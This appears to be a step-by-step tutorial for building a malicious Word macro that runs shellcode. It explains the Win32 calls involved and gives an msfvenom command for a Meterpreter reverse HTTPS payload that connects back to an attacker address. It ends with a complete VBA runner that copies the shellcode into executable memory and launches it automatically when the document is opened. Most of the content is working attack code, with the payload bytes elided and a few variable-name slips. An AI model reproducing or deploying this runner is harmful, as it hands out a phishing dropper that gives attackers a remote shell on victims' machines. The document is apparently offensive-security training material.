## Win32 APIs to be used
We will use 3 Win32 APIs from the kernel32.dll to build the shellcode runner:
- VirtualAlloc -  allocate unmanaged memory that is writable, readable, and executable
- RtlMoveMemory - copy the shellcode into the newly allocated memory
- CreateThread - create a new execution thread in the process to execute shellcode


## VirtualAlloc
The function prototype looks as follows:
```C
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

The function takes 4 arguments:
- lpAddress - The memory allocation address(set to 0 for application to set it)
- dwSize - Size of the memory allocated
- flAllocationType - Indicates the allocation type
- flProtect - Indicates the memory protections used

Declaring the function:
```VBA
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```

We now begin to generate our shellcode so as to figure out values for the function using msfvenom:
```msfvenom
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.150 LPORT=443 EXITFUNC=thread -f vbapplication
```


After the payload is generated we start declaring our varaiables:
```VBA
Function Mymacro()
	Dim Var1 As Variant
	Dim Var2 As LongPtr
```

Now that we have declared our variables it's time to assign them values:
```VBA
buf = Array(232,143..........213)

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

Arguments set for VirtualAlloc:
- lpAddress = 0(to leave memory alllocation to the API)
- dwSize = Ubound(buf) - This function allows us to get the size of the array containing the shellcode
- flAllocationType = 0x3000(hex)/&H3000 - equates to the allocation type enums of _MEM_COMMIT_ and _MEM_RESERVE_.
- flProtect - &H40 - indicates that memory allocated is readable, writable and executable.

Final VirtualAlloc function code:

```VBA
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Function Mymacro()
	Dim Buf As Variant
	Dim addr As LongPtr

Buf = Array(232,143..........213)

addr = VirtualAlloc(0, UBound(Var1), &H3000, &H40)

	
```


## RtlMoveMemory
The function prototype looks as follows:
```C
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```

The function takes 3 arguments:
- Destination -  Points to the newly allocated buffer, which is already a memory pointer.
- Source - Address of an element from the shellcode array.
- Length - Passed by value.

Declaring the function:
```VBA
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
```

Declaring the variables to pass as arguments:
```VBA
Dim counter As Long
Dim data As Long
Dim res As Long
```

Assigning values to the variables:
``` VBA
For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```
 Here, we are using a loop over each element of the shellcode array and create a byte-by-byte copy of our payload.
 The loop condition uses the _LBound_ and _UBound_ methods to find the first and last element of the array.

In this code, we imported _RtlMoveMemory_, declared two long variables and copied our payload.

Final RtlMoveMemory function code:
```VBA
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Dim counter As Long
Dim data As Long
Dim res As Long

For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```


## CreateThread

The function prototype looks as follows:
```C
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```

The function takes many arguments, but most are not needed and can be set to 0. We need to import the function and start trasnlate the arguments to VBA data types:
- lpThreadAttributes - Used to set non default can be set 0
- dwStackSize - Used to set non default can be set 0
- lpStartAddress - Start address for code execution and must be the address of our shellcode buffer. This is translated to _LongPtr_.
- lpParameter - Pointer to arguments for the code residing at the starting address. Can be set to 0 with data type Longptr since our shellcode does not require a parameter/argument.
- dwCreatingFlags - flags that control the creation of the thread (can be set to 0)
- lpThreadId - A pointer to a variable that receives the thread identifier. (cane be set to 0)

Declaring the function:
```VBA
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```
- This [reference](https://www.pinvoke.net/search.aspx?search=createthread&namespace=[All]) can be used.

We can now call the function with the already previously declared variables:
```VBA
res = CreateThread(0, 0, addr, 0, 0, 0)
```


## Putting everything together

The final word macro will look something like this:
```VBA
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim Buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    Buf = Array(232,143..........213)

    addr = VirtualAlloc(0, UBound(Buf), &H3000, &H40)
    
    For counter = LBound(Buf) To UBound(Buf)
        data = Buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```